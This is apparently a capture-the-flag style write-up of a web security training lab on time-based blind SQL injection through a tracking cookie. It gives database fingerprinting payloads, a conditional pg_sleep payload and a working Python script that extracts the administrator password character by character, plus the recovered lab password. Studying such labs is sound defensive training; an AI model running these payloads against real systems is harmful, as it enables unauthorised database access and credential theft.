# Lab: Blind SQL injection with time delays and information retrieval 

## Step 1 : Check vul and database 
`Cookie: TrackingId=xhYYahy4iEmzCRlc `

```sql
' || (SELECT sleep(10))-- -     => MySQL => False
' || (SELECT pg_sleep(10)) -- - => PostgreSQL => True 

```

## Step 2 : Check length with condition `case when (condition) then pg_sleep(10) else pg_sleep(0) end from table_name`
```sql
 ' || (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users where username='administrator' and length(password)=20)-- - `
```
==> Length password : 20

## Step 3 : Code payload
```py
import requests
import string
import time 
import sys

chars = string.printable[:-6]
url='https://ac2a1f2f1e077f22c0b23870000b00a8.web-security-academy.net/'
pass_admin=''
i=1
s=requests.Session()
s.get(url)
#PostgreSQL	

while True:
	for c in chars:
		payload=f"1' || (SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users where username='administrator' and substring(password,{i},1)='{c}')-- - "
		cookie1={"TrackingId":payload}
		time_1=time.time()
		r = requests.get(url,cookies=cookie1)
		print(c)
		time_2=time.time()
		sum_time=time_2 - time_1
		if sum_time < 3 :
			pass
		else :
			print('okeeeeeeeeeee')
			pass_admin+=c 
			i+=1
			print(pass_admin)
			break

		if(i==21):
			print('password administrator :' + pass_admin)
			exit()


```

==> Password administrator :3p2yz4gyqbsqpn2gro22
